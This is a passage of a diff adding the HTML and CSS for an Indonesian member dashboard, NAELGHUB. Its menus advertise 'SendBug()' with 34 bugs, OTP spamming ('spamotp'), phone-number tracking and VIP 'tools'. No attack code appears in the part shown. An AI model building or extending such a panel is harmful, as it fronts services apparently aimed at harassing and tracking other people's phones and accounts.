@@ -1,0 +1,2463 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<title>Dashboard · NAELGHUB</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;600;700&family=Press+Start+2P&family=VT323&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+<link rel="stylesheet" href="style.css" />
+<style>
+/* NOXXA builder — glass mobile bottom-sheet UI */
+.noxxa-shell{max-width:760px;margin:12px auto 90px;border:1px solid rgba(255,255,255,.16);border-radius:30px;background:rgba(8,10,18,.66);backdrop-filter:blur(22px);box-shadow:0 28px 90px rgba(0,0,0,.45);overflow:hidden}
+.noxxa-handle{width:76px;height:6px;border-radius:99px;background:rgba(255,255,255,.25);margin:12px auto 2px}
+.noxxa-head{display:flex;align-items:center;justify-content:space-between;padding:20px 22px 12px}.noxxa-head h3{margin:0;font-family:'JetBrains Mono',monospace;letter-spacing:2px;font-size:20px}.noxxa-step{padding:7px 12px;border-radius:12px;background:rgba(255,23,68,.16);border:1px solid rgba(255,23,68,.42);color:#ff6b86;font:700 12px 'JetBrains Mono',monospace}
+.noxxa-section{padding:0 22px 22px}.noxxa-label{display:block;margin:8px 0 9px;font:700 12px 'JetBrains Mono',monospace;letter-spacing:2px;color:rgba(255,255,255,.8);text-transform:uppercase}
+.noxxa-preview{border:1px solid rgba(255,255,255,.16);border-radius:25px;padding:10px;background:rgba(0,0,0,.28);box-shadow:inset 0 0 30px rgba(0,0,0,.22)}
+.noxxa-phone{height:310px;border-radius:18px;overflow:hidden;background:#fff;color:#333;position:relative;border:3px solid #171923}.noxxa-statusbar{height:26px;background:#0b0c10;color:#eee;display:flex;align-items:center;justify-content:space-between;padding:0 12px;font:12px Arial}.noxxa-urlbar{height:42px;background:#11131a;color:#ddd;display:flex;align-items:center;gap:9px;padding:0 12px;font:13px 'JetBrains Mono',monospace}.noxxa-urlpill{flex:1;background:#08090d;border-radius:8px;padding:9px 11px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.noxxa-web{height:calc(100% - 68px);display:grid;place-items:center;background:linear-gradient(180deg,#f7f7f8,#e8e8eb);color:#555;font:20px Arial}.noxxa-web strong{font-size:30px;color:#222}.noxxa-web small{display:block;margin-top:10px;color:#777}
+.noxxa-source{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:18px}.noxxa-source button{min-height:58px;border-radius:16px;border:1px solid rgba(255,255,255,.13);background:rgba(255,255,255,.055);color:#fff;font:700 13px 'JetBrains Mono',monospace;cursor:pointer}.noxxa-source button.active{background:rgba(255,23,68,.16);border-color:#e52b35;box-shadow:0 0 18px rgba(255,23,68,.1)}
+.noxxa-field{margin-top:16px}.noxxa-field input,.noxxa-field select{width:100%;box-sizing:border-box;padding:15px 16px;border-radius:17px;border:1px solid rgba(255,255,255,.15);background:rgba(0,0,0,.24);color:#fff;outline:none;font:14px 'JetBrains Mono',monospace}.noxxa-field input:focus{border-color:rgba(255,23,68,.7);box-shadow:0 0 0 3px rgba(255,23,68,.08)}
+.noxxa-grid2{display:grid;grid-template-columns:1.35fr .65fr;gap:12px}.noxxa-grid2.equal{grid-template-columns:1fr 1fr}.noxxa-iconbox{display:flex;align-items:center;gap:14px;padding:14px;border:1px solid rgba(255,255,255,.14);border-radius:18px;background:rgba(0,0,0,.2)}.noxxa-iconpreview{width:76px;height:76px;border-radius:18px;border:2px solid rgba(255,23,68,.65);display:grid;place-items:center;background:#111;color:#aaa;overflow:hidden}.noxxa-iconpreview img{width:100%;height:100%;object-fit:cover}.noxxa-iconbox input{border:0;padding:0;background:transparent}.noxxa-help{font-size:11px;color:rgba(255,255,255,.52);margin-top:7px}
+.noxxa-actions{display:flex;gap:10px;margin-top:20px}.noxxa-btn{flex:1;padding:16px;border-radius:17px;border:1px solid rgba(255,255,255,.16);color:#fff;background:rgba(255,255,255,.06);font:800 13px 'JetBrains Mono',monospace;cursor:pointer}.noxxa-btn.primary{background:linear-gradient(135deg,#ff1744,#d71920);border-color:#ff334f;box-shadow:0 10px 30px rgba(255,23,68,.18)}.noxxa-btn:active{transform:scale(.98)}
+.noxxa-status{margin-top:14px;padding:13px 15px;border-radius:15px;background:rgba(0,0,0,.24);border:1px solid rgba(255,255,255,.1);font:12px 'JetBrains Mono',monospace;color:rgba(255,255,255,.8)}.noxxa-note{margin-top:10px;font-size:11px;color:rgba(255,255,255,.48);line-height:1.5}.noxxa-hidden{display:none!important}
+
+/* Compact collapsible dashboard sections */
+.nx-accordion{border:1px solid rgba(255,255,255,.11);border-radius:22px;background:rgba(5,7,12,.66);overflow:hidden;box-shadow:0 12px 35px rgba(0,0,0,.2)}
+.nx-acc-head{width:100%;display:flex;align-items:center;gap:10px;padding:16px 17px;border:0;background:transparent;color:#fff;text-align:left;cursor:pointer;font:800 12px 'JetBrains Mono',monospace;letter-spacing:.7px}
+.nx-acc-head span{flex:1}.nx-acc-head span i{color:#ff1744;margin-right:9px}.nx-acc-state{font-size:9px;color:rgba(255,255,255,.55);font-weight:700}.nx-acc-chevron{font-size:10px;color:#ff1744;transition:transform .22s ease}.nx-accordion.open .nx-acc-chevron{transform:rotate(180deg)}
+.nx-acc-body{display:grid;grid-template-rows:0fr;transition:grid-template-rows .28s ease,opacity .2s ease;opacity:0}.nx-accordion.open .nx-acc-body{grid-template-rows:1fr;opacity:1}.nx-acc-body>*{min-height:0;overflow:hidden;padding:0 12px 12px}.nx-card-flat{box-shadow:none;border-radius:16px}.nx-livehub{gap:11px}.nx-live-grid{grid-template-columns:repeat(3,minmax(0,1fr));gap:9px}.nx-live-card{min-height:105px;padding:12px}.nx-live-card .num{font-size:22px}
+.nx-build-link{display:flex;align-items:center;gap:12px;text-decoration:none;color:#fff}.nx-build-link .nx-acc-state{margin-left:auto}
+@media(max-width:600px){.nx-live-grid{grid-template-columns:1fr 1fr}.nx-profile{padding:15px;border-radius:22px}.nx-profile-main{gap:10px}.nx-avatar{width:58px;height:58px}.nx-profile-name{font-size:16px}.nx-expiry{min-width:92px}.nx-expiry .value{font-size:13px}.nx-acc-head{padding:14px 13px}.nx-acc-body>*{padding:0 8px 8px}.nx-live-card{min-height:96px}.nx-live-card .icon{width:36px;height:36px;font-size:16px}.nx-live-card .title{font-size:10px}}
+
+@media(max-width:600px){.noxxa-shell{margin:8px -8px 90px;border-radius:28px}.noxxa-head,.noxxa-section{padding-left:18px;padding-right:18px}.noxxa-grid2,.noxxa-grid2.equal{grid-template-columns:1fr}.noxxa-phone{height:270px}}
+/* NOXXA mobile/desktop full-screen sheet fix */
+#panel-noxxa.active{position:fixed;inset:0;z-index:9999;overflow-y:auto;overflow-x:hidden;width:100vw;max-width:100vw;box-sizing:border-box;background:rgba(4,7,14,.42);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);padding:12px 12px 100px;}
+#panel-noxxa.active .noxxa-shell{width:min(760px,100%);max-width:760px;margin:0 auto 24px;box-sizing:border-box;}
+body.noxxa-open .dash-bottom-nav{display:none!important;}
+body.noxxa-open .main-content{overflow:hidden;}
+@media(max-width:600px){#panel-noxxa.active{padding:0 0 18px;}#panel-noxxa.active .noxxa-shell{width:100%;max-width:none;min-height:100dvh;margin:0;border-radius:0 0 24px 24px;}#panel-noxxa.active .noxxa-actions{position:sticky;bottom:8px;z-index:3;padding-top:8px;background:linear-gradient(180deg,transparent,rgba(8,10,18,.94) 35%);}#panel-noxxa.active .noxxa-phone{width:100%;} }
+
+#panel-noxxaweb.active{position:fixed;inset:0;z-index:9999;overflow-y:auto;overflow-x:hidden;width:100vw;max-width:100vw;box-sizing:border-box;background:rgba(4,7,14,.42);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);padding:12px 12px 100px;}
+#panel-noxxaweb.active .noxxa-shell{width:min(760px,100%);max-width:760px;margin:0 auto 24px;box-sizing:border-box;}
+@media(max-width:600px){#panel-noxxaweb.active{padding:0 0 18px;}#panel-noxxaweb.active .noxxa-shell{width:100%;max-width:none;min-height:100dvh;margin:0;border-radius:0 0 24px 24px;}#panel-noxxaweb.active .noxxa-actions{position:sticky;bottom:8px;z-index:3;padding-top:8px;background:linear-gradient(180deg,transparent,rgba(8,10,18,.94) 35%);}}
+/* ===== NOXXA LIVE HUB DASHBOARD UPDATE ===== */
+.nx-livehub{margin:18px 0;display:flex;flex-direction:column;gap:14px}.nx-profile{position:relative;overflow:hidden;border:1px solid rgba(255,255,255,.14);border-radius:28px;padding:18px;background:linear-gradient(135deg,rgba(255,23,68,.28),rgba(30,30,40,.72) 52%,rgba(0,0,0,.68));box-shadow:0 18px 55px rgba(0,0,0,.35)}.nx-profile:after{content:"";position:absolute;inset:auto -30px -65px auto;width:190px;height:190px;border-radius:50%;background:radial-gradient(circle,rgba(255,215,0,.24),transparent 65%);pointer-events:none}.nx-profile-main{display:flex;align-items:center;gap:14px;position:relative;z-index:1}.nx-avatar{width:72px;height:72px;border-radius:50%;display:grid;place-items:center;font-size:28px;font-weight:900;background:linear-gradient(135deg,#222,#111);border:3px solid #fff;box-shadow:0 0 0 4px rgba(255,23,68,.35);overflow:hidden}.nx-avatar img{width:100%;height:100%;object-fit:cover}.nx-profile-name{font-size:21px;font-weight:900;letter-spacing:.5px}.nx-profile-sub{font-size:11px;color:rgba(255,255,255,.65);margin-top:3px}.nx-expiry{margin-left:auto;text-align:right;min-width:125px}.nx-expiry .label{font-size:9px;letter-spacing:1.5px;color:rgba(255,255,255,.55)}.nx-expiry .value{font-size:16px;font-weight:900;margin-top:4px}.nx-expiry .countdown{font-size:10px;color:#ffd54f;margin-top:3px}.nx-live-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}.nx-live-card{min-height:118px;border-radius:22px;padding:15px;background:rgba(10,10,16,.72);border:1px solid rgba(255,255,255,.11);box-shadow:0 12px 35px rgba(0,0,0,.22);position:relative;overflow:hidden}.nx-live-card .icon{width:42px;height:42px;border-radius:14px;display:grid;place-items:center;background:rgba(255,255,255,.08);font-size:19px;margin-bottom:9px}.nx-live-card .num{font-size:26px;font-weight:900;line-height:1}.nx-live-card .title{font-size:11px;margin-top:5px;color:rgba(255,255,255,.78)}.nx-live-card .sub{font-size:9px;color:rgba(255,255,255,.46);margin-top:5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.nx-pulse{display:inline-block;width:7px;height:7px;border-radius:50%;background:#00e676;box-shadow:0 0 0 0 rgba(0,230,118,.55);animation:nxPulse 1.7s infinite;vertical-align:middle;margin-right:4px}@keyframes nxPulse{70%{box-shadow:0 0 0 9px rgba(0,230,118,0)}100%{box-shadow:0 0 0 0 rgba(0,230,118,0)}}.nx-media-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:14px}.nx-card{border-radius:24px;background:rgba(7,8,12,.76);border:1px solid rgba(255,255,255,.12);overflow:hidden;box-shadow:0 15px 45px rgba(0,0,0,.25)}.nx-card-head{padding:15px 17px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid rgba(255,255,255,.08)}.nx-card-head h3{margin:0;font-size:14px}.nx-card-head small{font-size:9px;color:rgba(255,255,255,.45)}.nx-news-list{max-height:275px;overflow:auto;padding:8px}.nx-news-cat{border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.04);color:#aaa;border-radius:999px;padding:6px 9px;font-size:9px;white-space:nowrap}.nx-news-cat.active{background:#ff1744;color:#fff;border-color:#ff1744}.nx-news-item{display:block;padding:10px;border-radius:14px;text-decoration:none;color:#fff;border-bottom:1px solid rgba(255,255,255,.05)}.nx-news-item:hover{background:rgba(255,255,255,.05)}.nx-news-title{font-size:11px;font-weight:700;line-height:1.35}.nx-news-meta{font-size:8px;color:rgba(255,255,255,.42);margin-top:5px}.nx-music-box{padding:14px}.nx-music-row{display:flex;gap:10px;align-items:center}.nx-music-cover{width:52px;height:52px;border-radius:15px;background:linear-gradient(135deg,#ff1744,#8b00ff);display:grid;place-items:center;font-size:21px;flex:none}.nx-music-title{font-size:12px;font-weight:800}.nx-music-artist{font-size:9px;color:rgba(255,255,255,.5);margin-top:3px}.nx-music-controls{display:flex;gap:7px;margin-top:12px}.nx-mini-btn{width:38px;height:38px;border-radius:12px;border:1px solid rgba(255,255,255,.1);background:rgba(255,255,255,.06);color:#fff;cursor:pointer}.nx-music-search{display:flex;gap:7px;margin-top:11px}.nx-music-search input{flex:1;min-width:0;border:1px solid rgba(255,255,255,.1);background:rgba(255,255,255,.04);color:#fff;border-radius:12px;padding:9px;font-size:10px;outline:none}.nx-music-results{max-height:125px;overflow:auto;margin-top:7px}.nx-song{display:flex;gap:8px;align-items:center;padding:8px;border-radius:10px;cursor:pointer}.nx-song:hover{background:rgba(255,255,255,.05)}.nx-social{display:grid;grid-template-columns:1fr;gap:12px}.nx-social-form{padding:14px}.nx-upload-row{display:grid;grid-template-columns:1fr 1fr;gap:8px}.nx-social textarea{width:100%;box-sizing:border-box;resize:none;min-height:58px;border-radius:13px;border:1px solid rgba(255,255,255,.1);background:rgba(255,255,255,.04);color:#fff;padding:10px;font-size:10px;outline:none;margin-bottom:8px}.nx-social input[type=file]{width:100%;font-size:9px;color:rgba(255,255,255,.7);margin-top:7px}.nx-upload-btn{width:100%;padding:11px;border:0;border-radius:13px;background:linear-gradient(135deg,#ff1744,#9c27b0);color:#fff;font-weight:900;cursor:pointer;margin-top:10px}.nx-feed{display:flex;flex-direction:column;gap:10px;padding:12px;max-height:390px;overflow:auto}.nx-post{border-radius:18px;background:rgba(255,255,255,.035);border:1px solid rgba(255,255,255,.08);overflow:hidden}.nx-post-head{padding:10px 12px;display:flex;justify-content:space-between;gap:8px}.nx-post-user{font-size:11px;font-weight:900}.nx-post-time{font-size:8px;color:rgba(255,255,255,.4)}.nx-post-caption{padding:0 12px 10px;font-size:10px;line-height:1.4}.nx-post video{width:100%;max-height:360px;background:#000;display:block}.nx-post audio{width:calc(100% - 24px);margin:0 12px 12px;height:34px}.nx-post-actions{padding:8px 12px;border-top:1px solid rgba(255,255,255,.06);font-size:9px;color:rgba(255,255,255,.5)}.nx-empty{padding:18px;text-align:center;font-size:10px;color:rgba(255,255,255,.4)}
+@media(max-width:720px){.nx-live-grid{grid-template-columns:1fr 1fr}.nx-media-grid{grid-template-columns:1fr}.nx-profile-main{align-items:flex-start}.nx-expiry{min-width:105px}.nx-profile-name{font-size:18px}}
+@media(max-width:470px){.nx-live-grid{grid-template-columns:1fr}.nx-profile-main{flex-wrap:wrap}.nx-expiry{margin-left:86px;text-align:left}.nx-upload-row{grid-template-columns:1fr}}
+
+</style>
+</head>
+<body class="dashboard-active">
+
+<div id="app">
+  <video id="dashboardBgVideo" class="dashboard-bg-video" autoplay muted loop playsinline preload="auto" aria-hidden="true">
+    <source id="dashboardBgSource" src="tiktokio.com1789904488_quPNz2ugt0suf7KUcFIS.mp4" type="video/mp4">
+  </video>
+  <div id="dashboard-bg-overlay"></div>
+  <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
+
+  <!-- SIDEBAR -->
+  <nav class="sidebar" id="sidebar">
+    <div class="sidebar-brand"><span class="icon"><i class="fas fa-spider"></i></span><h2>NAELGHUB</h2></div>
+    <div class="user-info">
+      <div class="avatar" id="sidebarAvatar">U</div>
+      <div class="info">
+        <div class="name" id="sidebarUsername">User</div>
+        <div style="margin-top:2px;"><span class="role-badge member" id="sidebarRoleBadge">MEMBER</span></div>
+        <div style="font-size:10px;margin-top:2px;color:var(--text-secondary)">Exp: <span id="sidebarExp">-</span></div>
+      </div>
+    </div>
+    <ul class="sidebar-nav" id="sidebarNav">
+      <li><a class="active" data-page="dashboard"><i class="fas fa-home"></i> Dashboard</a></li>
+      <li><a data-page="chat"><i class="fas fa-comments"></i> Sender Global</a></li><li><a data-page="privatechat"><i class="fas fa-user-lock"></i> Sender Private</a></li><li><a data-page="pairing"><i class="fas fa-link"></i> Pairing</a></li>
+      <li><a data-page="member" data-min-role="member"><i class="fas fa-users"></i> Member Panel</a></li><li><a data-page="noxxa" data-min-role="member"><i class="fas fa-mobile-screen-button"></i> Noxxa Build APK</a></li><li><a data-page="noxxaweb" data-min-role="member"><i class="fas fa-globe"></i> NOXXA Build URL/Website</a></li>
+      <li><a data-page="sendbug"><i class="fas fa-server"></i> SendBug()</a></li>
+      <li><a data-page="aic"><i class="fas fa-robot"></i> AI Chat Groq</a></li>
+      <li><a data-page="apis"><i class="fas fa-plug"></i> Multi API</a></li>
+      <li><a data-page="tools" data-min-role="vip"><i class="fas fa-skull-crossbones"></i> Tools VIP</a></li>
+      <li><a data-page="tracker" data-min-role="vip"><i class="fas fa-search-location"></i> Lacak Nomor</a></li>
+      <li><a data-page="music"><i class="fas fa-music"></i> Music</a></li>
+      <li><hr class="sidebar-divider" /></li>
+      <li><a data-page="spamotp" data-min-role="vip"><i class="fas fa-shield-halved"></i> OTP Test Sandbox</a></li>
+      <li><a data-page="history"><i class="fas fa-history"></i> History</a></li>
+      <li><a data-page="settings"><i class="fas fa-cog"></i> Settings</a></li>
+      <li><a data-page="about"><i class="fas fa-info-circle"></i> About</a></li>
+      <li><hr class="sidebar-divider" /></li>
+      <li><a onclick="handleLogout()" style="color:#ff1744;cursor:pointer;"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
+    </ul>
+  </nav>
+
+  <main class="main-content">
+    <header class="header">
+      <div class="header-left" style="display:flex;align-items:center;gap:12px">
+        <button class="hamburger" onclick="toggleSidebar()"><i class="fas fa-bars"></i></button>
+        <div>
+          <h2 id="pageTitle">Dashboard</h2>
+          <p>Halo, <span id="headerUsername">User</span> · <span id="headerRoleBadge" class="role-badge member">MEMBER</span></p>
+        </div>
+      </div>
+      <div class="header-right">
+        <div class="status-bar">
+          <span class="item"><i class="fas fa-signal"></i> <span id="signalLevel">4G</span></span>
+          <span class="divider"></span>
+          <span class="item" id="clockDisplay">00:00</span>
+          <span class="divider"></span>
+          <span class="item"><i class="fas fa-battery-three-quarters"></i> <span id="batteryLevel">--%</span></span>
+        </div>
+        <div class="status"><span class="status-dot"></span> Online</div>
+        <div class="avatar" id="headerAvatar">U</div>
+      </div>
+    </header>
+
+    <!-- ============ DASHBOARD ============ -->
+    <div class="panel active" id="panel-dashboard">
+      <div class="panel-inner">
+        <div class="dash-banner-card">
+          <span class="banner-badge">NAEL</span>
+          <div class="logo-area">
+            <i class="fas fa-spider logo-img"></i>
+            <div class="brand-title">NAELGHUB</div>
+            <div class="brand-sub">Extreme · Real-Time · Horror</div>
+          </div>
+        </div>
+
+        <div class="dash-info-row">
+          <div class="info-widget">
+            <div class="widget-icon"><i class="fas fa-cloud-sun" id="weatherIcon"></i></div>
+            <div class="widget-info">
+              <div class="widget-label">Cuaca</div>
+              <div class="widget-value" id="weatherValue">--°C</div>
+              <div class="widget-sub" id="weatherSub">Loading...</div>
+            </div>
+          </div>
+          <div class="info-widget" id="gpsLocationWidget">
+            <div class="widget-icon"><i class="fas fa-location-crosshairs"></i></div>
+            <div class="widget-info">
+              <div class="widget-label">Lokasi GPS</div>
+              <div class="widget-value" id="ipLocation">Belum diambil</div>
+              <div class="widget-sub" id="ipDetail">Tekan tombol untuk memakai GPS perangkat</div>
+              <div class="widget-sub" id="addressRealtime" style="margin-top:4px;line-height:1.35">Alamat real-time: --</div>
+              <button type="button" id="gpsLocationBtn" onclick="getPreciseGPS()" style="margin-top:8px;padding:7px 11px;border:0;border-radius:8px;cursor:pointer;background:var(--accent,#4285f4);color:#fff;font-weight:700;">📍 Ambil Lokasi GPS</button>
+            </div>
+          </div>
+          <div class="info-widget live-telemetry-widget">
+            <div class="widget-icon"><i class="fas fa-gauge-high"></i></div>
+            <div class="widget-info">
+              <div class="widget-label">Perangkat Real-Time</div>
+              <div class="widget-value" id="networkSpeed">-- Mbps</div>
+              <div class="widget-sub"><span id="networkType">Jaringan --</span> · <span id="networkRtt">RTT -- ms</span></div>
+              <div class="widget-sub" style="margin-top:3px">🔋 <span id="batteryDetail">--%</span> · 🕒 <span id="clockDetail">--:--:--</span></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="dash-section-label"><span>⚡ Quick Access</span><span class="badge-count">34 fitur</span></div>
+        <div class="dash-quick-grid">
+          <div class="dash-quick-card" onclick="navigate('sendbug')"><i class="fas fa-rocket qc-icon" style="color:#ff1744;"></i><div class="qc-label">SendBug</div><div class="qc-sub">34 bug</div></div>
+          <div class="dash-quick-card" onclick="navigate('aic')"><i class="fas fa-robot qc-icon" style="color:#4285f4;"></i><div class="qc-label">AI Chat</div><div class="qc-sub">Groq</div></div>
+          <div class="dash-quick-card" onclick="navigate('apis')"><i class="fas fa-plug qc-icon" style="color:#00e676;"></i><div class="qc-label">Multi API</div><div class="qc-sub">7 tools</div></div>
+          <div class="dash-quick-card" onclick="navigate('chat')"><i class="fas fa-comments qc-icon" style="color:#00d4ff;"></i><div class="qc-label">Chat</div><div class="qc-sub">Live</div></div>
+          <div class="dash-quick-card" id="dashQuickMember" onclick="navigate('member')" style="display:none;"><i class="fas fa-users qc-icon" style="color:#ffd700;"></i><div class="qc-label">Member</div><div class="qc-sub">Jualan</div></div><div class="dash-quick-card" onclick="navigate('noxxa')"><i class="fas fa-mobile-screen-button qc-icon" style="color:#ff1744;"></i><div class="qc-label">Build APK</div><div class="qc-sub">Noxxa</div></div><div class="dash-quick-card" onclick="navigate('noxxaweb')"><i class="fas fa-globe qc-icon" style="color:#00d4ff;"></i><div class="qc-label">Build Website</div><div class="qc-sub">URL / HTML / Folder</div></div>
+          <div class="dash-quick-card" onclick="navigate('music')"><i class="fas fa-music qc-icon" style="color:#8b00ff;"></i><div class="qc-label">Music</div><div class="qc-sub">Player</div></div>
+          <div class="dash-quick-card" onclick="navigate('tracker')"><i class="fas fa-search-location qc-icon" style="color:#ff9100;"></i><div class="qc-label">Lacak</div><div class="qc-sub">Nomor</div></div>
+          <div class="dash-quick-card" onclick="navigate('settings')"><i class="fas fa-palette qc-icon" style="color:#ffd700;"></i><div class="qc-label">Tema</div><div class="qc-sub">Warna</div></div>
+        </div>
+
+        <div class="dash-greeting">
+          <div class="g-avatar" id="greetAvatar">U</div>
+          <div class="g-text">
+            <div class="g-line1">Ahlan Wa Sahlan,</div>
+            <div class="g-line2"><span id="greetName">User</span> <span class="star">⭐</span></div>
+          </div>
+        </div>
+
+
+        <!-- ===== ONE-DASHBOARD LIVE HUB / COLLAPSIBLE ===== -->
+        <section class="nx-livehub" aria-label="NAELGHUB Live Dashboard">
+          <div class="nx-profile">
+            <div class="nx-profile-main">
+              <div class="nx-avatar" id="nxDashAvatar">U</div>
+              <div style="flex:1;min-width:0">
+                <div class="nx-profile-name">Ahlan Wa Sahlan, <span id="nxDashName">USER</span> ⭐</div>
+                <div class="nx-profile-sub"><span class="nx-pulse"></span>Dashboard real-time · <span id="nxDashRole">MEMBER</span></div>
+              </div>
+              <div class="nx-expiry"><div class="label">EXPIRED MEMBER</div><div class="value" id="nxDashExpiry">--</div><div class="countdown" id="nxDashExpiryCountdown">--</div></div>
+            </div>
+          </div>
+
+          <div class="nx-accordion open" data-nx-acc="status">
+            <button class="nx-acc-head" type="button" onclick="toggleNoxxaSection(this)"><span><i class="fas fa-chart-simple"></i> STATUS PENGGUNA</span><b class="nx-acc-state">Tutup</b><i class="fas fa-chevron-up nx-acc-chevron"></i></button>
+            <div class="nx-acc-body">
+              <div class="nx-live-grid">
+                <div class="nx-live-card"><div class="icon" style="color:#00e676"><i class="fas fa-users"></i></div><div class="num" id="nxOnlineUsers">0</div><div class="title"><span class="nx-pulse"></span>Online User</div><div class="sub" id="nxOnlineNames">Memuat presence...</div></div>
+                <div class="nx-live-card"><div class="icon" style="color:#00d4ff"><i class="fas fa-link"></i></div><div class="num" id="nxSenderCount">0</div><div class="title">Sender / Seder</div><div class="sub" id="nxSenderInfo">Memeriksa backend...</div></div>
+                <div class="nx-live-card"><div class="icon" style="color:#ffd54f"><i class="fas fa-calendar-check"></i></div><div class="num" id="nxExpiryDays">--</div><div class="title">Sisa Masa Member</div><div class="sub" id="nxExpiryDetail">Mengikuti Member Panel</div></div>
+              </div>
+            </div>
+          </div>
+
+          <div class="nx-accordion" data-nx-acc="news">
+            <button class="nx-acc-head" type="button" onclick="toggleNoxxaSection(this)"><span><i class="fas fa-newspaper"></i> BERITA REAL-TIME</span><b class="nx-acc-state">Buka</b><i class="fas fa-chevron-down nx-acc-chevron"></i></button>
+            <div class="nx-acc-body">
+              <div class="nx-card nx-card-flat">
+                <div class="nx-card-head"><h3><i class="fas fa-newspaper" style="color:#ff9100"></i> SEMUA BERITA</h3><small id="nxNewsUpdated">Memuat...</small></div>
+                <div style="padding:9px 10px 0;display:flex;gap:7px"><input id="nxNewsSearch" placeholder="Cari semua berita..." style="flex:1;min-width:0;border:1px solid rgba(255,255,255,.1);background:rgba(255,255,255,.04);color:#fff;border-radius:11px;padding:9px;font-size:10px;outline:none" onkeypress="if(event.key==='Enter')loadNoxxaNews()"><button class="nx-mini-btn" onclick="loadNoxxaNews()"><i class="fas fa-search"></i></button></div>
+                <div id="nxNewsCats" style="display:flex;gap:6px;overflow:auto;padding:8px 10px 2px;scrollbar-width:none"><button class="nx-news-cat active" data-cat="semua" onclick="setNoxxaNewsCategory('semua')">Semua</button><button class="nx-news-cat" data-cat="indonesia" onclick="setNoxxaNewsCategory('indonesia')">Indonesia</button><button class="nx-news-cat" data-cat="dunia" onclick="setNoxxaNewsCategory('dunia')">Dunia</button><button class="nx-news-cat" data-cat="teknologi" onclick="setNoxxaNewsCategory('teknologi')">Teknologi</button><button class="nx-news-cat" data-cat="olahraga" onclick="setNoxxaNewsCategory('olahraga')">Olahraga</button><button class="nx-news-cat" data-cat="ekonomi" onclick="setNoxxaNewsCategory('ekonomi')">Ekonomi</button><button class="nx-news-cat" data-cat="hiburan" onclick="setNoxxaNewsCategory('hiburan')">Hiburan</button><button class="nx-news-cat" data-cat="kesehatan" onclick="setNoxxaNewsCategory('kesehatan')">Kesehatan</button><button class="nx-news-cat" data-cat="sains" onclick="setNoxxaNewsCategory('sains')">Sains</button><button class="nx-news-cat" data-cat="game" onclick="setNoxxaNewsCategory('game')">Game</button></div>
+                <div class="nx-news-list" id="nxNewsList"><div class="nx-empty">Memuat berita...</div></div>
+              </div>
+            </div>
+          </div>
+
+          <div class="nx-accordion" data-nx-acc="music">
+            <button class="nx-acc-head" type="button" onclick="toggleNoxxaSection(this)"><span><i class="fas fa-music"></i> MUSIK REAL-TIME</span><b class="nx-acc-state">Buka</b><i class="fas fa-chevron-down nx-acc-chevron"></i></button>
+            <div class="nx-acc-body">
+              <div class="nx-card nx-card-flat">
+                <div class="nx-card-head"><h3><i class="fas fa-music" style="color:#d05cff"></i> MUSIK</h3><small>Full track bila sumber menyediakan</small></div>
+                <div class="nx-music-box">
+                  <div class="nx-music-row"><div class="nx-music-cover"><i class="fas fa-music"></i></div><div style="min-width:0"><div class="nx-music-title" id="nxMusicTitle">Pilih lagu</div><div class="nx-music-artist" id="nxMusicArtist">NAELGHUB</div></div></div>
+                  <audio id="nxDashAudio" controls preload="metadata" style="width:100%;margin-top:10px;height:35px"></audio>
+                  <div class="nx-music-controls"><button class="nx-mini-btn" onclick="prevSong()"><i class="fas fa-backward"></i></button><button class="nx-mini-btn" onclick="togglePlay()"><i class="fas fa-play"></i></button><button class="nx-mini-btn" onclick="nextSong()"><i class="fas fa-forward"></i></button></div>
+                  <div class="nx-music-search"><input id="nxMusicSearch" placeholder="Cari lagu/artis seluruh dunia..." onkeypress="if(event.key==='Enter')searchNoxxaDashboardMusic()"><button class="nx-mini-btn" onclick="searchNoxxaDashboardMusic()"><i class="fas fa-search"></i></button></div>
+                  <div class="nx-music-results" id="nxMusicResults"><div class="nx-empty">Katalog global akan dimuat.</div></div><div id="nxLyricsBox" style="margin-top:10px;padding:10px;border-radius:12px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.08);max-height:180px;overflow:auto;display:none"><div style="font-size:10px;font-weight:800;margin-bottom:6px">🎤 LIRIK</div><pre id="nxLyricsText" style="white-space:pre-wrap;font:10px/1.6 Inter,sans-serif;margin:0;color:rgba(255,255,255,.78)"></pre></div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="nx-accordion" data-nx-acc="social">
+            <button class="nx-acc-head" type="button" onclick="toggleNoxxaSection(this)"><span><i class="fas fa-camera-retro"></i> NOXXAGRAM</span><b class="nx-acc-state">Buka</b><i class="fas fa-chevron-down nx-acc-chevron"></i></button>
+            <div class="nx-acc-body">
+              <div class="nx-card nx-social">
+                <div class="nx-card-head"><h3><i class="fas fa-camera-retro" style="color:#ff4d9a"></i> NOXXAGRAM</h3><small>Foto · video · audio · feed realtime</small></div>
+                <div class="nx-social-form">
+                  <textarea id="nxPostCaption" placeholder="Tulis caption..."></textarea>
+                  <div class="nx-upload-row"><label style="font-size:9px;color:rgba(255,255,255,.6)">🎥 VIDEO<input id="nxPostVideo" type="file" accept="video/*"></label><label style="font-size:9px;color:rgba(255,255,255,.6)">🖼️ FOTO<input id="nxPostImage" type="file" accept="image/*"></label></div><label style="display:block;font-size:9px;color:rgba(255,255,255,.6);margin-top:7px">🎵 AUDIO OPSIONAL<input id="nxPostAudio" type="file" accept="audio/*"></label>
+                  <button class="nx-upload-btn" onclick="uploadNoxxaPost()"><i class="fas fa-cloud-arrow-up"></i> POST KE NOXXAGRAM</button>
